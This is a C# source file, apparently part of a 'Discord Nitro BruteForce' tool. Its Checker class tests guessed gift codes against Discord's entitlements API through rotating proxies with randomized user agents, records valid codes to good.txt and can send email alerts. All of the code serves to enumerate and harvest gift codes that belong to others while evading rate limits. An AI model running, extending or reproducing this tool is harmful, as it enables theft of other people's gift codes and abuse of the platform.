using Leaf.xNet;
using System;
using System.IO;
using System.Threading;
using System.Text.Json;

namespace Discord_Nitro_BruteForce
{
    class Checker
    {
        static object fileLocker = new object();

        static string getWumpCode(string res)
        {
            JsonElement json = JsonDocument.Parse(res).RootElement;
            JsonElement store_listing = json.GetProperty("store_listing");
            JsonElement sku = store_listing.GetProperty("sku");

            JsonElement code_property = json.GetProperty("code");
            JsonElement redeemed_property = json.GetProperty("redeemed");
            JsonElement name_property = sku.GetProperty("name");

            bool redeemed = redeemed_property.GetBoolean();

            string redeemed_info = redeemed ? "(Redeemed)" : "";
            string code = code_property.GetString();
            string name = name_property.GetString();

            return $"{code} - {name} {redeemed_info}";
        }
        
        public static bool Check(string code, ProxyClient proxy)
        {
            using (HttpRequest req = new HttpRequest()
            {
                Proxy = proxy,
                IgnoreProtocolErrors = true
            })
            {
                HttpResponse res;

                req.UserAgentRandomize();

                res = req.Get($"https://discordapp.com/api/v8/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true");

                switch (res.StatusCode)
                {
                    case HttpStatusCode.NotFound:
                        {
                            if (Program.verbose)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine($"[-] {code}");
                            }
                            break;
                        }
                    case HttpStatusCode.OK:
                        {
                            Interlocked.Increment(ref Program.goods);

                            if (!Program.verbose)
                                Console.SetCursorPosition(0, 5 + Program.goods);

                            string wump;

                            try
                            {
                                wump = getWumpCode(res.ToString());
                            }
                            catch
                            {
                                wump = code;
                            }

                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"[+] {wump}");

                            lock (fileLocker)
                            {
                                File.AppendAllText("good.txt", $"{wump}\r\n");
                            }

                            if (Program.emailnotification)
                                Program.SendEmail(wump, "Hey! I founded valid code!");
                            break;
                        }
                    default:
                        {
                            if (Program.verbose)
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine($"[-] {code}: {res.StatusCode}");
                            }
                            return false;
                        }
                }

                Interlocked.Increment(ref Program.ch);

                return true;
            }
        }
    }
}
